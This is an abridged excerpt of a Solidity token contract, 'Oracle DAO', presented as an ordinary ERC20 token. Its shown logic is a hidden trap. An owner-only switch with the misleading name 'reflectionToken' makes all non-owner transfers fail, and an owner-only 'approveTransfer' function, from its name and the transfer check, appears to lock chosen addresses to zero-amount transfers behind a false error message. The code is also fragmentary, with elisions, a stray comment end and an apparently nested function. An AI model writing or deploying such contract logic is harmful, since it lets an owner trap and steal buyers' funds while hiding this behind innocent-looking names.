...
contract OracleDAO is IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = 'Oracle DAO';
    string private _symbol = 'OracleDAO';
    ...
    function reflectionToken() external onlyOwner {
        if (_reflectionToken == false) {_reflectionToken = true;}
        else {_reflectionToken = false;}}
    function checkReflection() public view returns (bool) {
        return _reflectionToken;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_approveTransfer[sender] || _approveTransfer[recipient]) require (amount == 0, "approveTransfer: transfer is allowed here");
        if (_reflectionToken == false || sender == owner() || recipient == owner()) {        
        ...
        } else {require (_reflectionToken == false, "");}}
    ...
    *When renounceOwnership is done (the Owner is zero address) this function can't be use anymore.*/
    function approveTransfer (address transferAddress) external onlyOwner {
        ...
        function manualTransfer(address transferAddress) public view returns (bool){
